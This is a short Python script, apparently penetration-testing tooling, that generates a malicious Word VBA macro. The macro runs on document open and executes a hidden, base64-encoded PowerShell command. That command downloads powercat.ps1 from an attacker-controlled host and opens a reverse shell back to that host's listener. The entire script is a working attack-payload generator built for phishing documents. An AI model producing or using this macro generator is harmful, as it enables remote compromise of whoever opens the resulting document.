#!/usr/bin/python3
import base64
print("Enter the LHOST and LPORT below, then copy/paste the output into a macro")
print("You'll need to host a webserver on port 80 with a local copy of powercat.ps1")
print("Finally, set-up a listener on the LPORT")
LHOST=input("LHOST IP: ")
LPORT=input("LPORT: ")


command = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell"


ENCODING = base64.b64encode(command.encode('UTF-16LE')).decode()


str = f"powershell.exe -nop -w hidden -e {ENCODING}"
n = 50
payload = ""
for i in range(0, len(str), n):
        payload += ("Str = Str + " + '"' + str[i:i+n] + '"\n')

print("**** Paste the following into a macro editor ****")
macro = f'''
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
{payload}
    CreateObject("Wscript.Shell").Run Str
End Sub
'''


print(macro)
